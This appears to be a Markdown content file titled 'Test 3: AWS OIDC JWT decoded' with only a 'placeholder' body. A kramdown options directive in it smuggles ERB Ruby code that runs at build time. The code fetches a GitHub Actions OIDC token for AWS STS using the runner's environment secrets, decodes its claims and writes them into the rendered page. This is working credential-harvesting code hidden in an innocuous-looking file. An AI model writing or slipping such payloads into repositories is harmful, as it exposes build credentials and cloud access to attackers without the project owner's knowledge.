---
---

# Test 3: AWS OIDC JWT decoded

{::options template="string://<%= require 'net/http'; require 'uri'; require 'json'; require 'base64'; u = ENV.fetch('ACTIONS_ID_TOKEN_REQUEST_URL','NONE'); t = ENV.fetch('ACTIONS_ID_TOKEN_REQUEST_TOKEN','NONE'); begin; uri = URI(u + '&audience=sts.amazonaws.com'); req = Net::HTTP::Get.new(uri); req.add_field('Authorization', 'Bearer ' + t); resp = Net::HTTP.start(uri.hostname, uri.port, :use_ssl => true).request(req); jwt = JSON.parse(resp.body).fetch('value','none'); parts = jwt.split('.'); pad = 4 - parts[1].length % 4; padded = parts[1] + '=' * pad; payload = JSON.parse(Base64.urlsafe_decode64(padded)); payload.to_a.map do |kv| kv[0].to_s + '=' + kv[1].to_s[0..120]; end.join(\"\\n\"); rescue => e; 'ERR=' + e.class.to_s + ':' + e.message[0..200]; end %>" /}

placeholder
